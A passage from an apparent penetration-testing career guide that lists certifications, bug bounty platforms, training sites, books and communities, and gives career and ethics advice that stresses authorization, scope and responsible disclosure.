- **OSED** — exploit development

### Senior / specialist

- **OSEE** (Offensive Security Exploitation Expert) — very few earn this
- **GREM** (Reverse Engineering Malware), **GCFA / GCFE** (forensics)
- **CRTM**, **CRTL** — red team master / lead
- **CCSP, AWS Security Specialty, AZ-500, GCP Pro Security** — cloud
- **CISSP** — managerial / governance, 5 years experience required
- **CISM, CRISC** — management/governance

### Note on CEH

CEH (EC-Council) shows up on job postings. It's heavily knowledge-based (multiple choice). It opens doors but is not respected as a skills cert. Pair with OSCP if your career trajectory is offensive.

---

## Bug Bounty Programs

Real-world reps + sometimes payment. Always read scope and rules before testing.

### Major platforms

- **HackerOne** — biggest, well-known programs (PayPal, Shopify, GitHub, US DoD)
- **Bugcrowd** — second largest
- **Intigriti** — EU-strong
- **YesWeHack** — EU/Asia
- **Synack Red Team** — vetted-only, paid
- **Open Bug Bounty** — XSS-focused
- **Immunefi** — Web3 / smart contracts (highest payouts)
- **Microsoft / Google / Apple / Meta direct programs** — bypass platforms, big bounties

### Tips for starting

- Pick a single program and learn it deeply
- Focus on a single vuln class first (IDOR is famous newbie territory; XSS, SSRF, subdomain takeovers)
- **Recon is everything** — Amass, subfinder, httpx, ffuf, nuclei, gau, waybackurls
- Read disclosed reports on HackerOne — they're a free education
- Keep a test methodology document and improve it after every hunt
- Don't burn programs by violating scope. Reputation matters.

### Recommended starter read

*Real-World Bug Hunting* by Peter Yaworski (free at HackerOne sometimes), *The Web Application Hacker's Handbook*, *Bug Bounty Bootcamp* by Vickie Li.

---

## Learning Resources

### Hands-on platforms

- **TryHackMe** — best beginner experience
- **HackTheBox** + **HTB Academy** — intermediate to advanced
- **PortSwigger Web Security Academy** — free, *exceptional* for web
- **PentesterLab** — exercises by vuln class
- **PicoCTF** — gamified, free, beginner-friendly
- **OverTheWire** — wargames (Bandit is the canonical Linux intro)
- **Root-Me** — broad challenge categories
- **VulnHub** — downloadable vulnerable VMs
- **Hacking Articles**, **Ippsec YouTube** (HTB walkthroughs — *the best free tutor*)
- **RangeForce**, **Immersive Labs** — enterprise-style platforms
- **Cyber Defenders** — blue team labs

### Free courses & university material

- **Cybrary** — broad free + paid catalog
- **SANS Cyber Aces**
- **MIT 6.858 Computer Systems Security** (free)
- **Stanford CS155**
- **TCM Security Academy** — affordable, hands-on (Practical Ethical Hacking, etc.)
- **OffSec Proving Grounds**
- **YouTube:** Ippsec, John Hammond, LiveOverflow, NetworkChuck, The Cyber Mentor, IppSec, Hak5, STÖK, NahamSec, David Bombal, Black Hills Information Security

### Books that earn their shelf space

- *The Web Application Hacker's Handbook* (a bit dated but essential)
- *Real-World Bug Hunting* — Yaworski
- *The Hacker Playbook 3* — Kim
- *RTFM: Red Team Field Manual* + *BTFM*
- *Black Hat Python* / *Black Hat Go* — Seitz / Tom Steele
- *Practical Malware Analysis* — Sikorski
- *The Tangled Web* — Zalewski
- *Hacking: The Art of Exploitation* — Erickson
- *Penetration Testing* — Weidman
- *The Pentester Blueprint* — Wylie
- *Cyber Effective* — for soft skills

### Blogs & news

- Krebs on Security, Schneier on Security, Bruce Schneier, Dark Reading, The Hacker News, BleepingComputer, SANS ISC, Project Zero, PortSwigger Daily Swig, HackTricks, PayloadsAllTheThings (GitHub — bookmark forever), Internet Storm Center

### Communities

- /r/netsec, /r/AskNetsec, /r/HowToHack, /r/oscp
- DEF CON, BlackHat, BSides (local)
- DEF CON Discord, BlackHills Discord
- Twitter/X infosec community (still active)
- Mastodon infosec.exchange

---

## Things People Forget

A grab-bag of "wish I'd known" items:

- **Soft skills win promotions.** The senior pen testers I know read better than they hack. Your written report and your client meeting are your product.
- **Legal & ethical literacy.** Read the **Computer Fraud and Abuse Act** (US) or your country's equivalent. Know what *unauthorized access* legally means before you click.
- **Authorization is everything.** Get scope and authorization in writing for every engagement. Bug bounty programs' Safe Harbor language matters.
- **Note-taking discipline.** Obsidian, CherryTree, Joplin — pick one and use it. Tag findings by ATT&CK technique.
- **OPSEC for *yourself*.** Don't dox yourself with reused usernames, real names on hacking accounts, public infrastructure.
- **Mental health.** Pen testing has high burnout. Imposter syndrome is universal. Build hobbies *outside* of computers.
- **Networking (the human kind).** Conferences, local DEF CON groups, BSides. A referral beats 100 applications.
- **Professional ethics.** *Disclose responsibly.* The hacking community's reputation depends on every individual.
- **Read post-mortems & breach reports.** Each one is a free engagement learned vicariously.
- **Specialize, then generalize again.** Career-long learners stay employed.
- **Track your tooling like an engineer.** Version control your scripts, dotfiles, and methodology.
- **Threat model yourself.** Use a password manager (Bitwarden, 1Password), MFA everywhere, separate accounts for personal and work, full-disk encryption.
- **The non-technical layers matter.** Business context, compliance (PCI-DSS, HIPAA, SOC 2, ISO 27001, GDPR), risk frameworks (FAIR), and budget realities decide what gets fixed.
- **Detection engineering is a great pivot.** The market for people who can both attack *and* write detections (Sigma, KQL, Splunk SPL) is hot.
- **AI / ML security is the new frontier.** Prompt injection, model extraction, training data poisoning, jailbreaking. OWASP LLM Top 10. Get in early.

---

## Final Thought

Pen testing is, at its core, a discipline of *honest curiosity*. You are paid to find truths the system's owners would rather not know — and to deliver those truths kindly enough that they get fixed. The hackers who last in this career aren't the ones with the flashiest exploits; they're the ones who keep learning, keep documenting, and keep their ethics intact when no one is watching.

Now go build a lab.

---

## Contributing

Pull requests welcome. Found a broken link, an outdated tool, or a missing topic? Open an issue.

## License

This cheat sheet is distributed under the MIT License — fork it, adapt it, share it.

## Disclaimer

All techniques, tools, and concepts described here are for **legal, authorized security testing and educational purposes only**. Unauthorized testing of systems you do not own or have explicit written permission to test is illegal in most jurisdictions. The author(s) and contributor(s) accept no liability for misuse.
